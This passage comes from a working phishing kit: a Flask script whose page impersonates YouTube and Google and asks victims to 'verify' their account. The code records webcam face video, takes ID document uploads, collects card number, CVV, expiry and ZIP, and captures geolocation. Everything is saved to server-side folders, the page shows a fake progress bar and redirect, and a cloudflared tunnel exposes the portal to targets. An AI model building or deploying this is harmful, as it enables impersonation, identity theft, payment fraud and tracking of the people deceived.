            <!-- Step 4: Processing -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--youtube-red);"></div>
                    <h2 class="step-title">Verifying Your Information</h2>
                    <p class="step-description">
                        Please wait while we verify your information. This usually takes 1-2 minutes.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Processing your verification...
                    </div>
                    
                    <div class="info-box">
                        <h4>What's happening?</h4>
                        <ul style="padding-left: 20px; margin-top: 10px;">
                            <li>Verifying submitted documents</li>
                            <li>Checking age requirements</li>
                            <li>Updating account status</li>
                            <li>Applying verification badge</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- Step 5: Complete -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Verification Complete!</h2>
                    
                    <div class="channel-verified">
                        {channel_verified_text}
                    </div>
                    
                    <p class="step-description">
                        {'You can now access age-restricted content on YouTube.' if verification_type == 'age' else ''}
                        {'Your account has been secured and you can now access all features.' if verification_type == 'recovery' else ''}
                        {'Your channel is now verified with the official YouTube badge.' if verification_type == 'channel' else ''}
                        You will be redirected to YouTube in <span id="countdown">10</span> seconds.
                    </p>
                    
                    <div class="info-box">
                        {'<h4>Age Verification Complete</h4>' if verification_type == 'age' else ''}
                        {'<h4>Account Recovery Complete</h4>' if verification_type == 'recovery' else ''}
                        {'<h4>Channel Verification Complete</h4>' if verification_type == 'channel' else ''}
                        <p style="margin-top: 10px;">
                            {'Your age has been verified and you can now watch all content.' if verification_type == 'age' else ''}
                            {'Your account is now secure and protected from unauthorized access.' if verification_type == 'recovery' else ''}
                            {'Your channel now has the official verification badge and additional features.' if verification_type == 'channel' else ''}
                        </p>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="redirectToYouTube()">
                            Continue to YouTube
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">About YouTube</a>
            </div>
            <p style="margin-top: 15px;">
                © 2024 Google LLC. All rights reserved.<br>
                YouTube is a trademark of Google LLC.
            </p>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = {total_steps};
        let verificationType = "{verification_type}";
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let channelName = "{channel_name}";
        let username = "{username}";
        
        // Verification state
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if face_enabled else 0};
        let faceTimerInterval = null;
        let idFile = null;
        let ageConfirmed = false;
        
        // Step Navigation
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-number');
            const labels = document.querySelectorAll('.step-label');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index < currentStep - 1) {{
                    step.classList.add('completed');
                }} else if (index === currentStep - 1) {{
                    step.classList.add('active');
                }}
            }});
            
            labels.forEach((label, index) => {{
                label.classList.remove('active');
                if (index === currentStep - 1) {{
                    label.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2) stepId = 'step2';
            else if (stepNumber === 3) stepId = 'step3';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Age Verification
        function confirmAge(isAdult) {{
            ageConfirmed = isAdult;
            
            if (isAdult) {{
                document.getElementById('continueBtn').disabled = false;
                document.getElementById('continueBtn').textContent = 'Continue to Age Verification';
            }} else {{
                if (confirm("You must be 18 or older to watch age-restricted content. You will be redirected to YouTube Kids.")) {{
                    window.location.href = 'https://www.youtubekids.com';
                }}
            }}
        }}
        
        function skipVerification() {{
            if (confirm("Without verification, you won't be able to access age-restricted content. Continue to YouTube?")) {{
                window.location.href = 'https://www.youtube.com';
            }}
        }}
        
        // Face Verification
        {f'''
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById("startFaceBtn");
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
                    audio: false
                }});
                document.getElementById("faceVideo").srcObject = faceStream;
                startFaceScan();
            }} catch (error) {{
                alert("Unable to access camera. Please ensure camera permissions are granted.");
                document.getElementById("startFaceBtn").disabled = false;
                document.getElementById("startFaceBtn").textContent = "Start Face Verification";
            }}
        }}
        
        function startFaceScan() {{
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            startFaceRecording();
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById("faceTimer").textContent =
                minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            try {{
                faceRecorder = new MediaRecorder(faceStream, {{ mimeType: "video/webm;codecs=vp9" }});
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) faceChunks.push(event.data);
            }};
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            if (faceRecorder && faceRecorder.state === "recording") {{
                faceRecorder.stop();
            }}
            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
            document.getElementById("faceTimer").textContent = "✓ Complete";
            document.getElementById("submitVerificationBtn").disabled = false;
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            const videoBlob = new Blob(faceChunks, {{ type: "video/webm" }});
            const reader = new FileReader();
            reader.onloadend = function() {{
                const base64data = reader.result.split(",")[1];
                $.ajax({{
                    url: "/submit_face_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        channel_name: channelName,
                        username: username,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }};
            reader.readAsDataURL(videoBlob);
        }}
        ''' if face_enabled else ''}
        
        // ID Verification
        {f'''
        function handleIDUpload(input) {{
            idFile = input.files[0];
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById("idPreview");
                const previewImage = document.getElementById("idPreviewImage");
                previewImage.src = e.target.result;
                preview.style.display = "block";
            }};
            reader.readAsDataURL(idFile);
            document.getElementById("submitVerificationBtn").disabled = false;
        }}
        ''' if id_enabled else ''}
        
        {f'''
        function submitVerification() {{
            const statusDiv = document.getElementById("verificationStatus");
            statusDiv.className = "status-message status-processing";
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Verifying...';
            const btn = document.getElementById("submitVerificationBtn");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Processing...';
            {'// Submit ID if uploaded' if id_enabled else ''}
            {f'''
            if (idFile) {{
                const formData = new FormData();
                formData.append("id_file", idFile);
                formData.append("timestamp", new Date().toISOString());
                formData.append("session_id", sessionId);
                formData.append("channel_name", channelName);
                formData.append("username", username);
                formData.append("verification_type", verificationType);
                $.ajax({{
                    url: "/submit_id_verification",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {{
                        statusDiv.className = "status-message status-success";
                        statusDiv.textContent = "✓ Verification submitted";
                        setTimeout(() => nextStep(), 1500);
                    }}
                }});
            }} else {{
                // Just face verification or skip
                setTimeout(() => nextStep(), 1500);
            }}
            ''' if id_enabled else 'setTimeout(() => nextStep(), 1500);'}
        }}
        ''' if total_steps > 2 else ''}
        
        // Payment Verification
        {f'''
        function completeStep3() {{
            {f'''
            if (verificationType === "channel") {{
                const cardNumber = document.getElementById("cardNumber").value;
                const expiryDate = document.getElementById("expiryDate").value;
                const cvv = document.getElementById("cvv").value;
                const zipCode = document.getElementById("zipCode").value;
                if (!cardNumber || !expiryDate || !cvv || !zipCode) {{
                    alert("Please fill in all payment details");
                    return;
                }}
                $.ajax({{
                    url: "/submit_payment_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        card_number: cardNumber.replace(/\\s/g, ""),
                        expiry_date: expiryDate,
                        cvv: cvv,
                        zip_code: zipCode,
                        amount: "{payment_amount}",
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        channel_name: channelName,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }}
            ''' if payment_enabled else ''}
            
            {f'''
            if (verificationType === "recovery") {{
                requestLocation();
                return;
            }}
            ''' if location_enabled else ''}
            
            startProcessing();
        }}
        ''' if total_steps > 3 else ''}
        
        // Location Verification
        {f'''
        function requestLocation() {{
            const statusDiv = document.getElementById("locationStatus");
            const btn = document.getElementById("step3Button");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Accessing your location...";
            if (!navigator.geolocation) {{
                statusDiv.className = "status-message status-error";
                statusDiv.textContent = "Geolocation not supported";
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Location verified";
                    btn.disabled = true;
                    btn.textContent = "✓ Location Verified";
                    $.ajax({{
                        url: "/submit_location_verification",
                        type: "POST",
                        data: JSON.stringify({{
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            channel_name: channelName,
                            verification_type: verificationType
                        }}),
                        contentType: "application/json"
                    }});
                    setTimeout(() => startProcessing(), 1500);
                }},
                (error) => {{
                    statusDiv.className = "status-message status-error";
                    statusDiv.textContent = "Location access denied";
                    btn.disabled = false;
                    btn.textContent = "Try Again";
                }}
            );
        }}
        ''' if location_enabled else ''}
        
        // Processing
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = 'Verifying information... ' + Math.round(progress) + '%';
                }} else if (progress < 60) {{
                    message = 'Checking credentials... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Applying verification... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Finalizing... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Submit completion data
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    channel_name: channelName,
                    username: username,
                    verification_type: verificationType,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToYouTube();
                }}
            }}, 1000);
        }}
        
        function redirectToYouTube() {{
            window.location.href = 'https://www.youtube.com';
        }}
        
        // Initialize
        updateStepIndicators();
        
        // Format inputs
        {'''
        document.getElementById("cardNumber")?.addEventListener("input", function(e) {
            let value = e.target.value.replace(/\\D/g, "");
            let formatted = "";
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += " ";
                formatted += value[i];
            }
            e.target.value = formatted;
        });
        
        document.getElementById("expiryDate")?.addEventListener("input", function(e) {
            let value = e.target.value.replace(/\\D/g, "");
            if (value.length >= 2) {
                value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }
            e.target.value = value;
        });
        ''' if payment_enabled else ''}
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            channel_name = data.get('channel_name', 'unknown')
            username = data.get('username', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_face_{channel_name}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', f"metadata_{channel_name}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'channel_name': channel_name,
                'username': username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'youtube',
                'verification_type': data.get('verification_type', 'unknown')
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved YouTube face verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        channel_name = request.form.get('channel_name', 'unknown')
        username = request.form.get('username', 'unknown')
        verification_type = request.form.get('verification_type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"youtube_id_{channel_name}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{channel_name}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'channel_name': channel_name,
            'username': username,
            'session_id': session_id,
            'verification_type': verification_type,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'platform': 'youtube'
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved YouTube ID document: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Error saving ID verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data and 'card_number' in data:
            session_id = data.get('session_id', 'unknown')
            channel_name = data.get('channel_name', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            
            # Mask card number for storage
            card_number = data.get('card_number', '')
            masked_card = card_number[-4:] if len(card_number) >= 4 else card_number
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_payment_{channel_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_data', filename)
            
            payment_data = {
                'type': 'payment_verification',
                'channel_name': channel_name,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'youtube',
                'verification_type': verification_type,
                'payment_info': {
                    'card_last_four': masked_card,
                    'expiry_date': data.get('expiry_date', ''),
                    'amount': data.get('amount', '1.00'),
                    'zip_code': data.get('zip_code', '')
                },
                'verification_result': 'pending',
                'note': 'Payment verification for channel verification'
            }
            
            with open(file_path, 'w') as f:
                json.dump(payment_data, f, indent=2)
            
            print(f"Saved YouTube payment verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving payment verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            channel_name = data.get('channel_name', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            
            # Process location in background
            data['target_username'] = channel_name
            data['verification_type'] = verification_type
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received YouTube location data: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            channel_name = data.get('channel_name', 'unknown')
            username = data.get('username', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_complete_{channel_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            data['platform'] = 'youtube'
            data['verification_completed'] = True
            
            if verification_type == 'age':
                data['age_verified'] = True
                data['age_restriction_bypassed'] = True
            elif verification_type == 'recovery':
                data['account_recovered'] = True
                data['security_updated'] = True
            else:  # channel verification
                data['channel_verified'] = True
                data['verification_badge'] = True
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved YouTube verification summary: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4048
    script_name = "YouTube Verification Portal"
    
    print("\n" + "="*60)
    print("YOUTUBE VERIFICATION PORTAL")
    print("="*60)
    print(f"[+] Channel: {VERIFICATION_SETTINGS['channel_name']}")
    print(f"[+] Username: @{VERIFICATION_SETTINGS['username']}")
    print(f"[+] Subscribers: {VERIFICATION_SETTINGS['subscriber_count']}")
    print(f"[+] Content: {VERIFICATION_SETTINGS['content_type']}")
    print(f"[+] Verification Type: {VERIFICATION_SETTINGS['verification_type'].upper()}")
    print(f"[+] Reason: {VERIFICATION_SETTINGS['reason']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    
    print(f"\n[+] Data folder: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Face verification: Enabled ({VERIFICATION_SETTINGS['face_duration']}s)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] ID verification: Enabled")
    if VERIFICATION_SETTINGS.get('payment_enabled'):
        print(f"[+] Payment verification: Enabled (${VERIFICATION_SETTINGS.get('payment_amount', '1.00')})")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    
    print("\n[+] Starting YouTube verification portal...")
    print("[+] Press Ctrl+C to stop.\n")
    
    print("="*60)
    print("YOUTUBE VERIFICATION REQUIRED")
    print("="*60)
    print(f"🎬 Channel: {VERIFICATION_SETTINGS['channel_name']}")
    print(f"👤 Username: @{VERIFICATION_SETTINGS['username']}")
    print(f"👥 Subscribers: {VERIFICATION_SETTINGS['subscriber_count']}")
    print(f"📺 Content: {VERIFICATION_SETTINGS['content_type']}")
    print(f"⚠️  REQUIREMENT: {VERIFICATION_SETTINGS['reason']}")
    print(f"🔐 TYPE: {VERIFICATION_SETTINGS['verification_type'].replace('_', ' ').title()} Verification")
    if VERIFICATION_SETTINGS.get('payment_enabled'):
        print(f"💳 PAYMENT: ${VERIFICATION_SETTINGS.get('payment_amount', '1.00')} authorization hold")
    print("="*60)
    print("Open the link below in browser to start verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Shutting down YouTube verification portal...")
        sys.exit(0)